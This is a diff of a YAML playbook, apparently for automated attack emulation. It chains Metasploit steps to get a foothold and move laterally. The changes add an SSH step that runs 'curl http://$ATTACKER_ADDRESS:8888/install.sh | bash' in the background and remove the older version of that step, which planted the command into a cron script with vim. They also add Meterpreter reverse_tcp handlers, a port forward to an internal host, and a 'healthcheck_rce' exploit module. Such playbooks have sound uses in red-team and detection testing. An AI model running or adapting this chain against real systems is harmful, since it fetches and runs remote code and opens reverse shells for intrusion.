@@ -76,7 +76,7 @@ commands:
     local_path: $RSHELL
 
   - type: msf-module
-    creates_session: movement
+    creates_session: portforward
     cmd: exploit/multi/handler
     payload: "cmd/unix/python/meterpreter/reverse_tcp"
     payload_options:
@@ -92,44 +92,29 @@ commands:
     kill_on_exit: true
 
   - type: ssh
-    session: foothold
-    cmd: "vim /media/share/healthcheck_cron.sh\n"
-    interactive: True
+    cmd: "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash"
+    background: True
 
-  - type: ssh
-    session: foothold
-    cmd: "G"
-    interactive: True
-
-  - type: ssh
-    session: foothold
-    cmd: "o"
-    interactive: True
-
-  - type: ssh
-    session: foothold
-    cmd: "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash\n"
-    interactive: True
-
-  - type: ssh
-    session: foothold
-    cmd: "1B"
-    interactive: True
-    bin: True
-
-  - type: ssh
-    session: foothold
-    cmd: ":wq\n"
-    interactive: True
-################### MOVED ############################################
   - type: msf-session
-    session: movement
+    session: portforward
     cmd: sysinfo
 
   - type: msf-session
-    session: movement
-    cmd: getuid
+    session: portforward
+    cmd: portfwd add -l 1881 -r 192.168.100.23 -p 1881
 
+  - type: msf-module
+    creates_session: movement
+    cmd: exploit/linux/misc/healthcheck_rce
+    payload: "cmd/linux/http/x64/meterpreter_reverse_tcp"
+    payload_options:
+      LHOST: $ATTACKER_ADDRESS
+      LPORT: "4444"
+    options:
+      RHOSTS: 127.0.0.1  
+
+
+#################### MOVED ################################
   - type: msf-session
     session: movement
     cmd: shell
